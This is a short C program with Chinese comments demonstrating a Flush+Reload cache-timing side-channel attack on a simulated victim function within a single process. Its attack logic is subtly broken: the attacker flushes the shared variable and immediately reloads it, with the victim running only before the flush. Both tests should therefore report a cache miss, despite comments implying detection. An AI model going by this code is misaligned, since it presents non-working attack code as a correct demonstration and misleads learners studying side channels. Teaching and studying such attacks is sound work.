#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>  // for _mm_clflush, _rdtsc
#include <unistd.h>

// 共享变量（模拟共享内存中的秘密）
volatile int secret_flag = 0;

// 受害者函数：根据秘密值访问共享变量
void victim(int secret) {
    if (secret == 1) {
        secret_flag = 1;  // 访问共享变量
    }
}

// 攻击者函数：Flush+Reload
int flush_reload(void *addr) {
    // Flush
    _mm_clflush(addr);
    _mm_mfence();

    // 等待受害者执行（模拟）
    // 实际中攻击者通过某种方式触发受害者

    // Reload并测量时间
    uint64_t start = __rdtsc();
    volatile int tmp = *(volatile int *)addr;
    uint64_t end = __rdtsc();
    uint64_t elapsed = end - start;

    // 阈值判断：通常cache hit < 100 cycles, cache miss > 200 cycles
    if (elapsed < 100) {
        return 1;  // 受害者访问过
    } else {
        return 0;  // 未访问
    }
}

int main() {
    // 攻击者先初始化共享变量
    secret_flag = 0;

    // 模拟受害者执行不同秘密值
    printf("Testing secret=0:\n");
    victim(0);
    int result0 = flush_reload((void*)&secret_flag);
    printf("  Detected access: %d\n", result0);

    printf("Testing secret=1:\n");
    victim(1);
    int result1 = flush_reload((void*)&secret_flag);
    printf("  Detected access: %d\n", result1);

    return 0;
}


